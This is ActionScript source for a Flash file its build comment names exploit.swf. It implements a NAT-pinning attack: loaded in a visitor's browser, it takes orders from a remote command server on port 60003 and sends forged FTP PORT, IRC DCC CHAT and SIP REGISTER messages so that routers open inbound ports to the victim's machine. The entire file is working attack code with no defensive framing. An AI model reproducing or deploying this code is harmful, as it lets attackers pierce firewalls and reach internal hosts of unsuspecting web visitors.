//as3compile exploit.as -o exploit.swf
package {
	import flash.display.MovieClip;
	import flash.net.Socket;
	import flash.events.*;
	import flash.system.Security;
	import flash.external.*; 
	import flash.system.Capabilities;
	
	public class Main extends MovieClip {
		static var socket:Socket
		static var socketCMD:Socket
		var sServer:String
		var iServerPort:int
		var sType:String
		var sCallbackPort:String
		var sCallbackIP:String
		var sClientID:String

      		function Main() {
			//get external vars
			sServer= root.loaderInfo.parameters.server as String;
			sType= root.loaderInfo.parameters.type as String;
			sCallbackPort = root.loaderInfo.parameters.cp as String;
			sCallbackIP = root.loaderInfo.parameters.ci as String;
			if (sType !=null){
				if (sType.toUpperCase()=="IRC"){startIRC();}
				if (sType.toUpperCase()=="FTP"){startFTP();}
				if (sType.toUpperCase()=="SIP"){startSIP();}
				if (sType.toUpperCase()=="CMD"){connectCMD(sServer);}
			}	
		}
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START COMMAND CHANNEL +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		function connectCMD(server:String):void{
			socketCMD = new Socket();
			socketCMD.addEventListener(Event.CONNECT, onConnectCMD);
			socketCMD.addEventListener(Event.CLOSE, onCloseCMD);
			socketCMD.addEventListener(IOErrorEvent.IO_ERROR, onError);
			socketCMD.addEventListener(ProgressEvent.SOCKET_DATA, onResponseCMD);
			socketCMD.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onSecError);
			socketCMD.connect(server,60003);
		}
		function onConnectCMD(e:Event):void{
			trace("Connected to Command Server")
			//socketCMD.writeUTFBytes("REG " + socketCMD.localAddress + "\r\n");//not supported in flash, need adobe air
			socketCMD.writeUTFBytes("REG " + sCallbackIP + "\r\n");
		}
		function onResponseCMD(e:ProgressEvent):void {
			if (socketCMD.bytesAvailable>0) {
				var data:String = socketCMD.readUTFBytes(socketCMD.bytesAvailable);
				var dataparts:Array = data.split(" ");
				switch(dataparts[0]){
					case "SET":
						if (dataparts[1]=="ID"){
							sClientID = dataparts[2];
							trace("Client Id = " + sClientID);
						}
						socketCMD.writeUTFBytes("POLL " + sClientID + "\r\n");socketCMD.flush();
						break;
					case "TEST":
						sCallbackIP = dataparts[2];
						sCallbackPort = dataparts[3];
						switch(dataparts[1]){
							case "FTP":
								startFTP();
								break;
							case "IRC":
								startIRC();
								break;
							case "SIP":
								startSIP();
								break;
							default:
								trace("Received invalid test protocol: " + dataparts[1]);
								break;
						}
						socketCMD.writeUTFBytes("POLL " + sClientID + "\r\n");socketCMD.flush();
						break;
					case "FIN":
						socketCMD.close();//todo, general cleanup of ALL open sockets
						break;
					case "NONE":
						//keep waiting for something to happen
						socketCMD.writeUTFBytes("POLL " + sClientID + "\r\n");socketCMD.flush();
						//XXX TODO implement 3 second sleep
						break
					default:
						trace("Invalid server command: " + data);
				}
				
			}
		}
		
		function onCloseCMD(e:Event):void {
			// Security error is thrown if this line is excluded
			socketCMD.close();
		}
		public static function createGUID():String {
			var uid:Array = new Array();
			var chars:Array = new Array( 48,49,50,51,52,53,54,55,56,57,65,66,67,68,69,70 );
			var separator:uint = 45;
			var template:Array = new Array( 8,4,4,4,12 );
     			
			for ( var a:uint = 0; a < template.length; a++ ) {
				for ( var b:uint = 0; b < template[a]; b++ ) {
					uid.push( chars[ Math.floor( Math.random() *  chars. length ) ] );
        			}
				if ( a < template.length - 1 ) {
					//uid.push( separator );
				}
			}
     
		    return String.fromCharCode.apply( null, uid );
		}
		//+++++++++++++++++++++++++++++++++++++++++++++++++ END COMMAND CHANNEL +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START FTP +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		function startFTP():void{
			trace("Starting FTP Test for " + sCallbackIP);
			socket = new Socket();
			socket.addEventListener(Event.CONNECT, onConnectFTP);
			socket.addEventListener(ProgressEvent.SOCKET_DATA, onResponseFTP)
			socket.addEventListener(Event.CLOSE, onClose);
			socket.addEventListener(IOErrorEvent.IO_ERROR, onError);;
			socket.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onSecError);
			socket.connect(sServer,21);
		}
		function onConnectFTP(e:Event):void {
			trace("FTP client connected to " + sServer);
		}
		function onResponseFTP(e:ProgressEvent):void {
			if (socket.bytesAvailable>0) {
				var data:String = socket.readUTFBytes(socket.bytesAvailable);
				trace("FTP in: " + data);
				data = data.substr(0,3)
				if (data=="220"){socket.writeUTFBytes("USER " + sClientID + " \r\n");socket.flush();}
				if (data=="331"){socket.writeUTFBytes("PASS natpin@work.net\r\n");socket.flush();}
				//logged in
				if (data=="230"){
					trace( "FTP NatPinTest: " + "PORT " + sCallbackIP.split(".").join(",") + "," + calcFTPPort(int(sCallbackPort)) + "\r\n");
					socket.writeUTFBytes("PORT " + sCallbackIP.split(".").join(",") + "," + calcFTPPort(int(sCallbackPort)) + "\r\n");
					socket.flush();
				}
				if (data=="200"){
					//port command succesfull, send list command
					socket.writeUTFBytes("LIST\r\n");
					socket.flush();
				}
			}
		}
		function calcFTPPort(port:int):String{
			var result:String ="";
			var x:int = port%256;
			var y:int = (port -x)/256;
			result = String(y) + "," + String(x);
			return result
		}
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START IRC +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		function startIRC():void{
			trace("Starting IRC Test for " + sCallbackIP);
			socket = new Socket();
			socket.addEventListener(Event.CONNECT, onConnectIRC);
			socket.addEventListener(ProgressEvent.SOCKET_DATA, onResponseIRC)
			socket.addEventListener(Event.CLOSE, onClose);
			socket.addEventListener(IOErrorEvent.IO_ERROR, onError);;
			socket.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onSecError);
			socket.connect(sServer,6667);
		}
		function onConnectIRC(e:Event):void {
			trace("IRC client connected to " + sServer);
		}
		function onResponseIRC(e:ProgressEvent):void {
			if (socket.bytesAvailable>0) {
				var data:String = socket.readUTFBytes(socket.bytesAvailable);
				// init
				if (data.indexOf("NOTICE")>0){socket.writeUTFBytes("NICK natpin\r\nUSER natpin natpin 127.0.0.1:natpin\r\n")};socket.flush()
				//end of motd
				if (data.indexOf("376")>0){socket.writeUTFBytes("PRIVMSG "+ sClientID + " :\1DCC CHAT chat "+ dot2num(sCallbackIP) +" "+ sCallbackPort+"\1\r\n")};socket.flush();
			}
		}
		function dot2num(ip:String):String {
	    		var long:Number = 0.0;
			var num_arr:Array = ip.split(".");
			for (var i:Number = 0; i < 4; i++)
	    		{
	        		long *= 256.0;
	        		long += parseInt(num_arr[i]);
	    		}
		    return String(long);
		}
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START SIP +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		function startSIP():void{
			trace("Starting SIP Test for " + sCallbackIP);
			socket = new Socket();
			socket.addEventListener(Event.CONNECT, onConnectSIP);
			socket.addEventListener(ProgressEvent.SOCKET_DATA, onResponseSIP);
			socket.addEventListener(Event.CLOSE, onClose);
			socket.addEventListener(IOErrorEvent.IO_ERROR, onError);;
			socket.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onSecError);
			socket.connect(sServer,5060);
		}
		function onConnectSIP(e:Event):void {
			trace("SIP client connected to " + sServer);
			var register:String = "REGISTER sip:$callbackip$ SIP/2.0\nCSeq: 1 REGISTER\nVia: SIP/2.0/TCP $callbackip$:$callbackport$;branch=z9hG4bK78946131-99e1-de11-8845-080027608325;rport\nUser-Agent: Ekiga/3.2.5\nFrom: <sip:$clientid$@$callbackip$>;tag=d60e6131-99e1-de11-8845-080027608325\nCall-ID: e4ec6031-99e1-de11-8845-080027608325@vvt-laptop\nTo: <sip:13@10.10.1.99>\nContact: <sip:$clientid$@$callbackip$>;q=1\nAllow: INVITE,ACK,OPTIONS,BYE,CANCEL,SUBSCRIBE,NOTIFY,REFER,MESSAGE,INFO,PING\nExpires: 3600\nContent-Length: 0\nMax-Forwards: 70\n";
			register = register.split("$callbackip$").join(sCallbackIP);
			register = register.split("$callbackport$").join(sCallbackPort);
			register = register.split("$clientid$").join(sClientID);
			socket.writeUTFBytes(register);socket.flush();
		}
		function onResponseSIP(e:ProgressEvent):void {

		}
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START ALL_PROTO +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		function onConnect(e:Event):void {
			trace("connected")
		}

		function onClose(e:Event):void {
			// Security error is thrown if this line is excluded
			socket.close();
		}

		function onError(e:IOErrorEvent):void {
			trace("IO Error: "+e);
		}

		function onSecError(e:SecurityErrorEvent):void {
			trace("Security Error: "+e);
		}

		function onResponse(e:ProgressEvent):void {
			if (socket.bytesAvailable>0) {
				var data:String = socket.readUTFBytes(socket.bytesAvailable)
			}
		}

		function calcFTP(port,ip):String{
		}
		function calcIRC(port,ip):String{
		}
	}
}
